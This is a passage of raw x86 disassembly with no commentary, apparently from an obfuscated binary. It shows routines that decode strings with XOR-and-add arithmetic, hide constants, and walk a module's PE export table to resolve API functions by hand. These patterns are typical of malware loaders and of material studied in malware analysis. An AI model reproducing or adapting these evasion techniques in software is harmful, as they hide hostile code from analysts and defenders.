  4268bc:	mov    eax,DWORD PTR [ebp-0x4]
  4268bf:	pop    ebx
  4268c0:	cmp    eax,0xf89c85a6
  4268c5:	je     0x4268d3
  4268c7:	xor    eax,ecx
  4268c9:	xor    ecx,ecx
  4268cb:	mov    WORD PTR [edi+eax*2+0x64e5ec],cx
  4268d3:	mov    eax,edi
  4268d5:	pop    edi
  4268d6:	pop    esi
  4268d7:	leave  
  4268d8:	ret    
  4268d9:	push   ebp
  4268da:	mov    ebp,esp
  4268dc:	push   ecx
  4268dd:	push   esi
  4268de:	mov    DWORD PTR [ebp-0x4],0xf89c85a6
  4268e5:	mov    esi,0xf89c85a5
  4268ea:	call   0x4267c1
  4268ef:	mov    cx,WORD PTR [eax]
  4268f2:	mov    edx,0x3b5d
  4268f7:	sub    cx,dx
  4268fa:	mov    edx,0x8a9b
  4268ff:	xor    cx,dx
  426902:	mov    edx,0x4e38
  426907:	cmp    cx,dx
  42690a:	je     0x426963
  42690c:	push   ebx
  42690d:	push   edi
  42690e:	movzx  ecx,cx
  426911:	mov    edx,0xffcd8d0a
  426916:	mov    edi,0x75108af
  42691b:	mov    ebx,0x4e4a
  426920:	cmp    cx,bx
  426923:	jne    0x426928
  426925:	mov    DWORD PTR [ebp-0x4],esi
  426928:	lea    esi,[edx+0x1]
  42692b:	xor    esi,edi
  42692d:	mov    edx,esi
  42692f:	xor    edx,edi
  426931:	mov    cx,WORD PTR [eax+edx*2+0x64e5ec]
  426939:	mov    ebx,0x3b5d
  42693e:	sub    cx,bx
  426941:	mov    ebx,0x8a9b
  426946:	xor    cx,bx
  426949:	mov    ebx,0x4e38
  42694e:	cmp    cx,bx
  426951:	jne    0x42691b
  426953:	cmp    DWORD PTR [ebp-0x4],0xf89c85a6
  42695a:	pop    edi
  42695b:	pop    ebx
  42695c:	je     0x426963
  42695e:	xor    eax,eax
  426960:	inc    eax
  426961:	jmp    0x426965
  426963:	xor    eax,eax
  426965:	pop    esi
  426966:	leave  
  426967:	ret    
  426968:	push   ebp
  426969:	mov    ebp,esp
  42696b:	push   ecx
  42696c:	mov    eax,DWORD PTR [ebp+0x8]
  42696f:	movzx  ecx,WORD PTR [eax]
  426972:	push   esi
  426973:	lea    eax,[ecx-0x3b5d]
  426979:	mov    esi,0x8a9b
  42697e:	push   edi
  42697f:	xor    eax,esi
  426981:	mov    edi,0x4e38
  426986:	mov    DWORD PTR [ebp-0x4],edx
  426989:	cmp    ax,di
  42698c:	je     0x4269b9
  42698e:	mov    eax,DWORD PTR [ebp+0x8]
  426991:	sub    eax,edx
  426993:	mov    DWORD PTR [ebp+0x8],eax
  426996:	jmp    0x42699b
  426998:	mov    eax,DWORD PTR [ebp+0x8]
  42699b:	mov    WORD PTR [edx],cx
  42699e:	add    edx,0x2
  4269a1:	movzx  edi,WORD PTR [eax+edx*1]
  4269a5:	mov    ecx,edi
  4269a7:	add    edi,0xffffc4a3
  4269ad:	xor    edi,esi
  4269af:	mov    eax,0x4e38
  4269b4:	cmp    di,ax
  4269b7:	jne    0x426998
  4269b9:	xor    eax,eax
  4269bb:	pop    edi
  4269bc:	mov    WORD PTR [edx],ax
  4269bf:	mov    eax,DWORD PTR [ebp-0x4]
  4269c2:	pop    esi
  4269c3:	leave  
  4269c4:	ret    0x4
  4269c7:	push   ebp
  4269c8:	mov    ebp,esp
  4269ca:	sub    esp,0x18
  4269cd:	mov    DWORD PTR [ebp-0x8],0xf89c85a5
  4269d4:	mov    DWORD PTR [ebp-0x18],0xf89c85a4
  4269db:	mov    ecx,DWORD PTR [ebp-0x8]
  4269de:	push   esi
  4269df:	mov    eax,0x75108af
  4269e4:	xor    ecx,eax
  4269e6:	mov    esi,0x3272f6
  4269eb:	add    ecx,esi
  4269ed:	mov    DWORD PTR [ebp-0x4],ecx
  4269f0:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  4269f7:	mov    DWORD PTR [ebp-0x10],0xf89c85a1
  4269fe:	push   edi
  4269ff:	mov    DWORD PTR [ebp-0x14],0xf89c85a3
  426a06:	jmp    0x426aa7
  426a0b:	mov    ecx,DWORD PTR [ebp-0x4]
  426a0e:	mov    edx,DWORD PTR [ebp+0x10]
  426a11:	sub    edx,ecx
  426a13:	mov    ecx,DWORD PTR [ebp-0xc]
  426a16:	xor    ecx,eax
  426a18:	add    ecx,esi
  426a1a:	cmp    edx,ecx
  426a1c:	jbe    0x426a39
  426a1e:	mov    edx,DWORD PTR [ebp-0x4]
  426a21:	add    edx,DWORD PTR [ebp+0x8]
  426a24:	mov    ecx,DWORD PTR [ebp-0x4]
  426a27:	add    ecx,DWORD PTR [ebp+0xc]
  426a2a:	mov    edi,DWORD PTR [ecx]
  426a2c:	mov    DWORD PTR [edx],edi
  426a2e:	mov    ecx,DWORD PTR [ecx+0x4]
  426a31:	mov    DWORD PTR [edx+0x4],ecx
  426a34:	mov    ecx,DWORD PTR [ebp-0xc]
  426a37:	jmp    0x426a86
  426a39:	mov    ecx,DWORD PTR [ebp-0x4]
  426a3c:	mov    edx,DWORD PTR [ebp+0x10]
  426a3f:	sub    edx,ecx
  426a41:	mov    ecx,DWORD PTR [ebp-0x10]
  426a44:	xor    ecx,eax
  426a46:	add    ecx,esi
  426a48:	cmp    edx,ecx
  426a4a:	mov    ecx,DWORD PTR [ebp-0x4]
  426a4d:	jbe    0x426a61
  426a4f:	add    ecx,DWORD PTR [ebp+0x8]
  426a52:	mov    edx,DWORD PTR [ebp-0x4]
  426a55:	add    edx,DWORD PTR [ebp+0xc]
  426a58:	mov    edx,DWORD PTR [edx]
  426a5a:	mov    DWORD PTR [ecx],edx
  426a5c:	mov    ecx,DWORD PTR [ebp-0x10]
  426a5f:	jmp    0x426a86
  426a61:	mov    edx,DWORD PTR [ebp+0x10]
  426a64:	sub    edx,ecx
  426a66:	mov    ecx,DWORD PTR [ebp-0x14]
  426a69:	xor    ecx,eax
  426a6b:	add    ecx,esi
  426a6d:	cmp    edx,ecx
  426a6f:	mov    ecx,DWORD PTR [ebp-0x4]
  426a72:	jbe    0x426a97
  426a74:	add    ecx,DWORD PTR [ebp+0x8]
  426a77:	mov    edx,DWORD PTR [ebp-0x4]
  426a7a:	add    edx,DWORD PTR [ebp+0xc]
  426a7d:	mov    dx,WORD PTR [edx]
  426a80:	mov    WORD PTR [ecx],dx
  426a83:	mov    ecx,DWORD PTR [ebp-0x14]
  426a86:	mov    edx,DWORD PTR [ebp-0x4]
  426a89:	xor    ecx,eax
  426a8b:	lea    ecx,[ecx+edx*1+0x3272f6]
  426a92:	mov    DWORD PTR [ebp-0x4],ecx
  426a95:	jmp    0x426aa7
  426a97:	add    ecx,DWORD PTR [ebp+0x8]
  426a9a:	mov    edx,DWORD PTR [ebp-0x4]
  426a9d:	add    edx,DWORD PTR [ebp+0xc]
  426aa0:	mov    dl,BYTE PTR [edx]
  426aa2:	mov    BYTE PTR [ecx],dl
  426aa4:	inc    DWORD PTR [ebp-0x4]
  426aa7:	mov    ecx,DWORD PTR [ebp-0x18]
  426aaa:	mov    edx,DWORD PTR [ebp+0x10]
  426aad:	xor    ecx,eax
  426aaf:	add    ecx,esi
  426ab1:	imul   ecx,edx
  426ab4:	mov    edx,DWORD PTR [ebp-0x8]
  426ab7:	mov    edi,DWORD PTR [ebp-0x4]
  426aba:	xor    edx,eax
  426abc:	lea    edx,[edx+edi*1+0x3272f6]
  426ac3:	cmp    edx,ecx
  426ac5:	jb     0x426a0b
  426acb:	pop    edi
  426acc:	pop    esi
  426acd:	leave  
  426ace:	ret    0xc
  426ad1:	push   ebp
  426ad2:	mov    ebp,esp
  426ad4:	sub    esp,0xc
  426ad7:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  426ade:	push   esi
  426adf:	mov    esi,eax
  426ae1:	mov    DWORD PTR [ebp-0x8],0xf89c85a4
  426ae8:	mov    edx,DWORD PTR [ebp-0x4]
  426aeb:	mov    eax,0x75108af
  426af0:	xor    edx,eax
  426af2:	mov    ecx,0x3272f6
  426af7:	add    edx,ecx
  426af9:	cmp    esi,edx
  426afb:	je     0x426b3d
  426afd:	push   ebx
  426afe:	push   edi
  426aff:	mov    edx,DWORD PTR [ebp-0x8]
  426b02:	mov    ebx,DWORD PTR [ebp+0x8]
  426b05:	xor    edx,eax
  426b07:	mov    edi,0xffcd8d0a
  426b0c:	sub    edi,edx
  426b0e:	add    esi,edi
  426b10:	lea    edx,[esi-0x3272f6]
  426b16:	xor    edx,eax
  426b18:	mov    DWORD PTR [ebp-0xc],edx
  426b1b:	mov    edx,DWORD PTR [ebp-0x4]
  426b1e:	mov    edi,DWORD PTR [ebp-0xc]
  426b21:	xor    dl,0xaf
  426b24:	sub    dl,0xa
  426b27:	xor    edi,eax
  426b29:	mov    BYTE PTR [edi+ebx*1+0x3272f6],dl
  426b30:	mov    edx,DWORD PTR [ebp-0x4]
  426b33:	xor    edx,eax
  426b35:	add    edx,ecx
  426b37:	cmp    esi,edx
  426b39:	jne    0x426aff
  426b3b:	pop    edi
  426b3c:	pop    ebx
  426b3d:	pop    esi
  426b3e:	leave  
  426b3f:	ret    0x4
  426b42:	push   ebp
  426b43:	mov    ebp,esp
  426b45:	sub    esp,0x21c
  426b4b:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  426b52:	mov    DWORD PTR [ebp-0x14],0xf89c85a4
  426b59:	mov    eax,DWORD PTR [ebp+0x10]
  426b5c:	mov    eax,DWORD PTR [ebp-0x4]
  426b5f:	mov    ecx,DWORD PTR [ebp+0x8]
  426b62:	push   esi
  426b63:	push   edi
  426b64:	mov    edi,0x75108af
  426b69:	xor    eax,edi
  426b6b:	mov    esi,0x3272f6
  426b70:	add    eax,esi
  426b72:	cmp    eax,ecx
  426b74:	mov    eax,DWORD PTR [ebp-0x4]
  426b77:	jne    0x426b82
  426b79:	xor    eax,edi
  426b7b:	add    eax,esi
  426b7d:	jmp    0x426c2e
  426b82:	mov    ecx,DWORD PTR [ebp+0xc]
  426b85:	xor    eax,edi
  426b87:	add    eax,esi
  426b89:	cmp    eax,ecx
  426b8b:	jne    0x426b92
  426b8d:	mov    eax,DWORD PTR [ebp-0x4]
  426b90:	jmp    0x426b79
  426b92:	lea    eax,[ebp-0x21c]
  426b98:	mov    DWORD PTR [ebp-0x8],eax
  426b9b:	mov    eax,DWORD PTR [ebp+0xc]
  426b9e:	mov    DWORD PTR [ebp-0x10],eax
  426ba1:	mov    eax,DWORD PTR [ebp-0x4]
  426ba4:	xor    eax,edi
  426ba6:	add    eax,esi
  426ba8:	mov    DWORD PTR [ebp+0x10],eax
  426bab:	mov    eax,DWORD PTR [ebp+0xc]
  426bae:	push   ebx
  426baf:	call   0x4268d9
  426bb4:	mov    ebx,eax
  426bb6:	mov    eax,DWORD PTR [ebp+0x8]
  426bb9:	mov    eax,DWORD PTR [eax+0x14]
  426bbc:	jmp    0x426c16
  426bbe:	mov    eax,DWORD PTR [ebp+0xc]
  426bc1:	sub    eax,0x8
  426bc4:	mov    DWORD PTR [ebp-0xc],eax
  426bc7:	mov    eax,DWORD PTR [ebp-0xc]
  426bca:	mov    eax,DWORD PTR [eax+0x28]
  426bcd:	call   0x4267c1
  426bd2:	mov    DWORD PTR [ebp+0x10],eax
  426bd5:	push   DWORD PTR [ebp+0x10]
  426bd8:	mov    edx,DWORD PTR [ebp-0x8]
  426bdb:	call   0x426968
  426be0:	mov    eax,DWORD PTR [ebp-0x4]
  426be3:	xor    eax,edi
  426be5:	add    eax,esi
  426be7:	cmp    eax,ebx
  426be9:	jne    0x426bf3
  426beb:	mov    eax,DWORD PTR [ebp-0x8]
  426bee:	call   0x42684f
  426bf3:	mov    eax,DWORD PTR [ebp-0x14]
  426bf6:	xor    eax,edi
  426bf8:	add    eax,esi
  426bfa:	push   eax
  426bfb:	push   DWORD PTR [ebp-0x10]
  426bfe:	mov    eax,DWORD PTR [ebp-0x8]
  426c01:	call   0x42657b
  426c06:	mov    ecx,DWORD PTR [ebp-0x4]
  426c09:	xor    ecx,edi
  426c0b:	add    ecx,esi
  426c0d:	cmp    eax,ecx
  426c0f:	je     0x426c34
  426c11:	mov    eax,DWORD PTR [ebp+0xc]
  426c14:	mov    eax,DWORD PTR [eax]
  426c16:	mov    DWORD PTR [ebp+0xc],eax
  426c19:	mov    eax,DWORD PTR [ebp+0x8]
  426c1c:	mov    ecx,DWORD PTR [ebp+0xc]
  426c1f:	add    eax,0x14
  426c22:	cmp    ecx,eax
  426c24:	jne    0x426bbe
  426c26:	mov    eax,DWORD PTR [ebp-0x4]
  426c29:	xor    eax,edi
  426c2b:	add    eax,esi
  426c2d:	pop    ebx
  426c2e:	pop    edi
  426c2f:	pop    esi
  426c30:	leave  
  426c31:	ret    0xc
  426c34:	mov    eax,DWORD PTR [ebp-0xc]
  426c37:	mov    eax,DWORD PTR [eax+0x18]
  426c3a:	jmp    0x426c2d
  426c3c:	push   ebp
  426c3d:	mov    ebp,esp
  426c3f:	mov    eax,DWORD PTR [ebp+0xc]
  426c42:	sub    esp,0x10
  426c45:	cmp    DWORD PTR [ebp+0x8],0x0
  426c49:	push   ebx
  426c4a:	push   esi
  426c4b:	push   edi
  426c4c:	je     0x426d01
  426c52:	test   eax,eax
  426c54:	je     0x426d01
  426c5a:	movzx  eax,WORD PTR [eax+0x20]
  426c5e:	mov    ecx,eax
  426c60:	mov    DWORD PTR [ebp-0x10],eax
  426c63:	xor    edx,edx
  426c65:	and    DWORD PTR [ebp-0x8],edx
  426c68:	mov    eax,0x8a9b
  426c6d:	xor    ecx,eax
  426c6f:	add    ecx,0x3b5d
  426c75:	mov    DWORD PTR [ebp-0xc],ecx
  426c78:	and    DWORD PTR [ebp-0x4],0x0
  426c7c:	xor    ecx,ecx
  426c7e:	push   0xffffff81
  426c80:	pop    edi
  426c81:	cmp    cx,WORD PTR [ebp-0xc]
  426c85:	jae    0x426ceb
  426c87:	lea    esi,[edx-0x3b5d]
  426c8d:	xor    esi,eax
  426c8f:	movzx  ecx,WORD PTR [ebp-0x4]
  426c93:	mov    ebx,DWORD PTR [ebp+0xc]
  426c96:	lea    ecx,[ebx+ecx*4]
  426c99:	cmp    WORD PTR [ecx+0x2],si
  426c9d:	jne    0x426cd6
  426c9f:	movzx  ecx,WORD PTR [ecx]
  426ca2:	mov    edi,0x4e38
  426ca7:	cmp    cx,di
  426caa:	jne    0x426cb8
  426cac:	mov    ebx,DWORD PTR [ebp+0x8]
  426caf:	movzx  edi,dx
  426cb2:	cmp    BYTE PTR [edi+ebx*1],0x0
  426cb6:	je     0x426ce5
  426cb8:	mov    ebx,DWORD PTR [ebp+0x8]
  426cbb:	movzx  edi,dx
  426cbe:	movsx  di,BYTE PTR [edi+ebx*1]
  426cc3:	mov    ebx,0x3b5d
  426cc8:	sub    di,bx
  426ccb:	xor    di,ax
  426cce:	cmp    cx,di
  426cd1:	je     0x426ce5
  426cd3:	push   0xffffff83
  426cd5:	pop    edi
  426cd6:	inc    DWORD PTR [ebp-0x4]
  426cd9:	mov    cx,WORD PTR [ebp-0xc]
  426cdd:	cmp    WORD PTR [ebp-0x4],cx
  426ce1:	jb     0x426c8f
  426ce3:	jmp    0x426ceb
  426ce5:	inc    DWORD PTR [ebp-0x8]
  426ce8:	push   0xffffff82
  426cea:	pop    edi
  426ceb:	mov    esi,DWORD PTR [ebp+0x8]
  426cee:	movzx  ecx,dx
  426cf1:	cmp    BYTE PTR [ecx+esi*1],0x0
  426cf5:	je     0x426d0a
  426cf7:	inc    edx
  426cf8:	cmp    edi,0xffffff83
  426cfb:	jne    0x426c78
  426d01:	xor    eax,eax
  426d03:	pop    edi
  426d04:	pop    esi
  426d05:	pop    ebx
  426d06:	leave  
  426d07:	ret    0x8
  426d0a:	mov    ecx,DWORD PTR [ebp-0x8]
  426d0d:	add    ecx,0xffffc4a3
  426d13:	xor    cx,ax
  426d16:	xor    eax,eax
  426d18:	cmp    cx,WORD PTR [ebp-0x10]
  426d1c:	sete   al
  426d1f:	jmp    0x426d03
  426d21:	push   ebp
  426d22:	mov    ebp,esp
  426d24:	sub    esp,0x50
  426d27:	push   edi
  426d28:	mov    edi,eax
  426d2a:	mov    eax,DWORD PTR [edi+0x1a8]
  426d30:	cmp    DWORD PTR [eax],0x0
  426d33:	jne    0x426d3c
  426d35:	xor    eax,eax
  426d37:	jmp    0x426e6d
  426d3c:	push   DWORD PTR [ebp+0x8]
  426d3f:	push   0x2c
  426d41:	pop    eax
  426d42:	call   0x426ad1
  426d47:	mov    edx,DWORD PTR [edi+0x1ac]
  426d4d:	lea    eax,[edi+0x22]
  426d50:	mov    DWORD PTR [ebp-0x4c],eax
  426d53:	lea    eax,[edi+0x44]
  426d56:	mov    DWORD PTR [ebp-0x48],eax
  426d59:	lea    eax,[edi+0x66]
  426d5c:	mov    DWORD PTR [ebp-0x44],eax
  426d5f:	lea    eax,[edi+0x88]
  426d65:	mov    DWORD PTR [ebp-0x40],eax
  426d68:	lea    eax,[edi+0xaa]
  426d6e:	mov    DWORD PTR [ebp-0x3c],eax
  426d71:	lea    eax,[edi+0xcc]
  426d77:	mov    DWORD PTR [ebp-0x38],eax
  426d7a:	lea    eax,[edi+0xee]
  426d80:	mov    DWORD PTR [ebp-0x34],eax
  426d83:	lea    eax,[edi+0x110]
  426d89:	mov    DWORD PTR [ebp-0x30],eax
  426d8c:	lea    eax,[edi+0x132]
  426d92:	mov    DWORD PTR [ebp-0x2c],eax
  426d95:	lea    eax,[edi+0x154]
  426d9b:	push   edi
  426d9c:	mov    DWORD PTR [ebp-0x50],edi
  426d9f:	mov    DWORD PTR [ebp-0x28],eax
  426da2:	call   0x426ea1
  426da7:	push   eax
  426da8:	mov    eax,DWORD PTR [edi+0x1a8]
  426dae:	push   DWORD PTR [eax]
  426db0:	call   0x426b42
  426db5:	mov    DWORD PTR [ebp-0x10],eax
  426db8:	test   eax,eax
  426dba:	je     0x426e6d
  426dc0:	mov    ecx,DWORD PTR [eax+0x3c]
  426dc3:	push   ebx
  426dc4:	push   esi
  426dc5:	mov    esi,DWORD PTR [ecx+eax*1+0x78]
  426dc9:	add    esi,eax
  426dcb:	mov    edi,DWORD PTR [esi+0x24]
  426dce:	mov    ecx,DWORD PTR [esi+0x1c]
  426dd1:	mov    edx,DWORD PTR [esi+0x20]
  426dd4:	mov    ebx,DWORD PTR [esi+0x18]
  426dd7:	add    edi,eax
  426dd9:	mov    DWORD PTR [ebp-0x20],edi
  426ddc:	mov    edi,DWORD PTR [esi+0x14]
  426ddf:	add    ecx,eax
  426de1:	add    edx,eax
  426de3:	mov    DWORD PTR [ebp-0xc],ecx
  426de6:	mov    DWORD PTR [ebp-0x1c],edx
  426de9:	mov    DWORD PTR [ebp-0x8],edi
  426dec:	cmp    edi,ebx
  426dee:	ja     0x426df3
  426df0:	mov    DWORD PTR [ebp-0x8],ebx
  426df3:	xor    ebx,ebx
  426df5:	mov    DWORD PTR [ebp-0x18],ebx
  426df8:	cmp    DWORD PTR [ebp-0x8],ebx
  426dfb:	jbe    0x426e6b
  426dfd:	jmp    0x426e02
  426dff:	mov    edx,DWORD PTR [ebp-0x1c]
  426e02:	mov    edi,DWORD PTR [ebp-0x20]
  426e05:	movzx  edi,WORD PTR [edi+ebx*2]
  426e09:	cmp    ebx,DWORD PTR [esi+0x18]
  426e0c:	jae    0x426e6b
  426e0e:	cmp    edi,DWORD PTR [esi+0x14]
  426e11:	jae    0x426e6b
  426e13:	mov    ebx,DWORD PTR [edx+ebx*4]
  426e16:	mov    edx,DWORD PTR [ebp+0x8]
  426e19:	mov    edi,DWORD PTR [ecx+edi*4]
  426e1c:	mov    DWORD PTR [ebp-0x4],edx
  426e1f:	lea    edx,[ebp-0x50]
  426e22:	add    ebx,eax
  426e24:	add    edi,eax
  426e26:	sub    edx,DWORD PTR [ebp+0x8]
  426e29:	mov    DWORD PTR [ebp-0x14],0xb
  426e30:	mov    DWORD PTR [ebp-0x24],edx
  426e33:	mov    edx,DWORD PTR [ebp-0x4]
  426e36:	cmp    DWORD PTR [edx],0x0
  426e39:	jne    0x426e56
  426e3b:	mov    eax,DWORD PTR [ebp-0x24]
  426e3e:	push   DWORD PTR [eax+edx*1]
  426e41:	push   ebx
  426e42:	call   0x426c3c
  426e47:	mov    ecx,DWORD PTR [ebp-0xc]
  426e4a:	test   eax,eax
  426e4c:	je     0x426e53
  426e4e:	mov    eax,DWORD PTR [ebp-0x4]
  426e51:	mov    DWORD PTR [eax],edi
  426e53:	mov    eax,DWORD PTR [ebp-0x10]
  426e56:	add    DWORD PTR [ebp-0x4],0x4
  426e5a:	dec    DWORD PTR [ebp-0x14]
  426e5d:	jne    0x426e33
  426e5f:	mov    ebx,DWORD PTR [ebp-0x18]
  426e62:	inc    ebx
  426e63:	mov    DWORD PTR [ebp-0x18],ebx
  426e66:	cmp    ebx,DWORD PTR [ebp-0x8]
  426e69:	jb     0x426dff
  426e6b:	pop    esi
  426e6c:	pop    ebx
  426e6d:	pop    edi
  426e6e:	leave  
  426e6f:	ret    0x4
  426e72:	push   ebp
  426e73:	mov    ebp,esp
  426e75:	mov    eax,DWORD PTR [ebp+0x8]
  426e78:	push   esi
  426e79:	push   DWORD PTR [eax+0x1e0]
  426e7f:	lea    esi,[eax+0x198]
  426e85:	mov    eax,DWORD PTR [ebp+0x8]
  426e88:	call   0x426d21
  426e8d:	mov    ecx,DWORD PTR [esi]
  426e8f:	mov    DWORD PTR [ecx],eax
  426e91:	mov    eax,DWORD PTR [esi]
  426e93:	xor    ecx,ecx
  426e95:	cmp    DWORD PTR [eax],ecx
  426e97:	pop    esi
  426e98:	setne  cl
  426e9b:	mov    eax,ecx
  426e9d:	pop    ebp
  426e9e:	ret    0x4
  426ea1:	mov    ecx,DWORD PTR [edi+0x188]
  426ea7:	push   ebx
  426ea8:	jmp    0x426ebd
  426eaa:	xor    eax,0x8a9b
  426eaf:	add    eax,0x3b5d
  426eb4:	mov    WORD PTR [ecx],ax
  426eb7:	add    ecx,0x2
  426eba:	add    edx,0x2
  426ebd:	movzx  eax,WORD PTR [edx]
  426ec0:	mov    ebx,0x4e38
  426ec5:	cmp    ax,bx
  426ec8:	jne    0x426eaa
  426eca:	xor    eax,eax
  426ecc:	mov    WORD PTR [ecx],ax
  426ecf:	mov    eax,DWORD PTR [edi+0x188]
  426ed5:	pop    ebx
  426ed6:	ret    
  426ed7:	push   edi
  426ed8:	mov    edi,eax
  426eda:	mov    eax,DWORD PTR [esi+0x188]
  426ee0:	shl    edi,0x6
  426ee3:	add    eax,edi
  426ee5:	jmp    0x426ef1
  426ee7:	xor    cl,0x7f
  426eea:	add    cl,0x4
  426eed:	mov    BYTE PTR [eax],cl
  426eef:	inc    eax
  426ef0:	inc    edx
  426ef1:	mov    cl,BYTE PTR [edx]
  426ef3:	cmp    cl,0x83
  426ef6:	jne    0x426ee7
  426ef8:	mov    BYTE PTR [eax],0x0
  426efb:	mov    eax,DWORD PTR [esi+0x188]
  426f01:	add    eax,edi
  426f03:	pop    edi
  426f04:	ret    
  426f05:	push   ebp
  426f06:	mov    ebp,esp
  426f08:	sub    esp,0x14
  426f0b:	mov    DWORD PTR [ebp-0x10],0xf89c85a5
  426f12:	mov    DWORD PTR [ebp-0x4],0xf89c85a4
  426f19:	mov    eax,DWORD PTR [ebx]
  426f1b:	mov    DWORD PTR [ebp-0x8],eax
  426f1e:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  426f25:	push   esi
  426f26:	push   edi
  426f27:	mov    DWORD PTR [ebp-0x14],0xead71885
  426f2e:	mov    edi,DWORD PTR [ebp-0x4]
  426f31:	mov    ecx,DWORD PTR [ebp-0x10]
  426f34:	mov    eax,0x75108af
  426f39:	xor    edi,eax
  426f3b:	mov    edx,0x3272f6
  426f40:	xor    ecx,eax
  426f42:	add    edi,edx
  426f44:	add    ecx,edx
  426f46:	imul   edi,ecx
  426f49:	jmp    0x426f91
  426f4b:	mov    ecx,DWORD PTR [ebp-0x8]
  426f4e:	mov    esi,DWORD PTR [ebp-0x4]
  426f51:	xor    ecx,eax
  426f53:	xor    esi,eax
  426f55:	add    ecx,edx
  426f57:	add    esi,edx
  426f59:	test   esi,ecx
  426f5b:	mov    esi,DWORD PTR [ebp-0x8]
  426f5e:	mov    ecx,DWORD PTR [ebp-0x4]
  426f61:	je     0x426f78
  426f63:	xor    ecx,eax
  426f65:	xor    esi,eax
  426f67:	add    ecx,edx
  426f69:	add    esi,edx
  426f6b:	shr    esi,cl
  426f6d:	mov    ecx,DWORD PTR [ebp-0x14]
  426f70:	xor    ecx,eax
  426f72:	add    ecx,edx
  426f74:	xor    esi,ecx
  426f76:	jmp    0x426f82
  426f78:	xor    esi,eax
  426f7a:	xor    ecx,eax
  426f7c:	add    esi,edx
  426f7e:	add    ecx,edx
  426f80:	shr    esi,cl
  426f82:	mov    DWORD PTR [ebp-0x8],esi
  426f85:	mov    ecx,DWORD PTR [ebp-0x4]
  426f88:	xor    ecx,eax
  426f8a:	lea    edi,[edi+ecx*1+0x3272f6]
  426f91:	mov    ecx,DWORD PTR [ebp-0xc]
  426f94:	mov    esi,DWORD PTR [ebp-0x4]
  426f97:	xor    esi,eax
  426f99:	xor    ecx,eax
  426f9b:	sub    ecx,esi
  426f9d:	cmp    edi,ecx
  426f9f:	jbe    0x426f4b
  426fa1:	mov    eax,DWORD PTR [ebp-0x8]
  426fa4:	pop    edi
  426fa5:	mov    DWORD PTR [ebx],eax
  426fa7:	mov    eax,DWORD PTR [ebp-0x8]
  426faa:	pop    esi
  426fab:	leave  
  426fac:	ret    
  426fad:	push   ebp
  426fae:	mov    ebp,esp
  426fb0:	sub    esp,0x38
  426fb3:	push   ebx
  426fb4:	mov    ebx,0xf89c85a5
  426fb9:	mov    DWORD PTR [ebp-0x4],ebx
  426fbc:	lea    ecx,[ebx-0x1]
  426fbf:	mov    DWORD PTR [ebp-0x24],ecx
  426fc2:	mov    eax,DWORD PTR [ebp-0x4]
  426fc5:	mov    edx,DWORD PTR [ebp+0x8]
  426fc8:	push   esi
  426fc9:	mov    esi,0x75108af
  426fce:	xor    eax,esi
  426fd0:	push   edi
  426fd1:	mov    edi,0x3272f6
  426fd6:	add    eax,edi
  426fd8:	cmp    edx,eax
  426fda:	mov    eax,DWORD PTR [ebp-0x4]
  426fdd:	je     0x427142
  426fe3:	mov    edx,DWORD PTR [ebp+0xc]
  426fe6:	xor    eax,esi
  426fe8:	add    eax,edi
  426fea:	cmp    edx,eax
  426fec:	je     0x42713f
  426ff2:	mov    eax,DWORD PTR [ebp+0x10]
  426ff5:	mov    edx,DWORD PTR [ebp+0xc]
  426ff8:	mov    DWORD PTR [ebp-0x14],eax
  426ffb:	mov    eax,DWORD PTR [ebp+0x8]
  426ffe:	mov    DWORD PTR [ebp-0x18],0xf89c853c
  427005:	mov    DWORD PTR [ebp-0xc],eax
  427008:	lea    eax,[ebx-0x2]
  42700b:	mov    DWORD PTR [ebp-0x1c],eax
  42700e:	mov    DWORD PTR [ebp-0x10],ebx
  427011:	mov    DWORD PTR [ebp+0xc],ecx
  427014:	mov    DWORD PTR [ebp+0x10],eax
  427017:	mov    eax,DWORD PTR [ebp+0xc]
  42701a:	xor    eax,esi
  42701c:	mov    DWORD PTR [ebp-0x20],edx
  42701f:	sub    edx,eax
  427021:	sub    edx,edi
  427023:	mov    DWORD PTR [ebp+0x8],edx
  427026:	mov    DWORD PTR [ebp-0x8],0xf89c85a0
  42702d:	jmp    0x42712f
  427032:	mov    eax,DWORD PTR [ebp+0xc]
  427035:	mov    ecx,DWORD PTR [ebp+0xc]
  427038:	xor    eax,esi
  42703a:	xor    ecx,esi
  42703c:	lea    ecx,[eax+ecx*1+0x64e5ec]
  427043:	mov    eax,DWORD PTR [ebp+0x8]
  427046:	xor    edx,edx
  427048:	div    ecx
  42704a:	mov    eax,DWORD PTR [ebp+0x10]
  42704d:	mov    ecx,DWORD PTR [ebp+0xc]
  427050:	xor    eax,esi
  427052:	xor    ecx,esi
  427054:	sub    eax,ecx
  427056:	cmp    edx,eax
  427058:	jne    0x4270ee
  42705e:	mov    eax,DWORD PTR [ebp+0x8]
  427061:	mov    ecx,DWORD PTR [ebp-0xc]
  427064:	mov    dl,BYTE PTR [eax+ecx*1]
  427067:	mov    eax,DWORD PTR [ebp-0x10]
  42706a:	mov    ecx,DWORD PTR [ebp-0x8]
  42706d:	xor    eax,esi
  42706f:	xor    ecx,esi
  427071:	add    eax,edi
  427073:	add    ecx,edi
  427075:	cmp    eax,ecx
  427077:	jae    0x4270bf
  427079:	lea    ecx,[eax-0x3272f6]
  42707f:	mov    DWORD PTR [ebp-0x4],ecx
  427082:	mov    ebx,DWORD PTR [ebp-0x4]
  427085:	xor    ebx,esi
  427087:	add    ebx,0x7f55d8e3
  42708d:	lea    ecx,[ebp+eax*4-0x38]
  427091:	mov    DWORD PTR [ecx],ebx
  427093:	mov    ebx,DWORD PTR [ecx]
  427095:	cmp    ebx,0x244ecb82
  42709b:	jbe    0x4270a5
  42709d:	add    DWORD PTR [ecx],0x405fcc1
  4270a3:	jmp    0x4270ab
  4270a5:	add    DWORD PTR [ecx],0xfdaf433f
  4270ab:	mov    ecx,DWORD PTR [ebp-0x8]
  4270ae:	xor    ecx,esi
  4270b0:	inc    eax
  4270b1:	inc    DWORD PTR [ebp-0x4]
  4270b4:	add    ecx,edi
  4270b6:	cmp    eax,ecx
  4270b8:	jb     0x427082
  4270ba:	mov    ebx,0xf89c85a5
  4270bf:	cmp    DWORD PTR [ebp-0x14],0x0
  4270c3:	jne    0x4270cd
  4270c5:	xor    dl,0x7f
  4270c8:	add    dl,0x4
  4270cb:	jmp    0x4270e3
  4270cd:	mov    eax,DWORD PTR [ebp-0x18]
  4270d0:	xor    al,0xaf
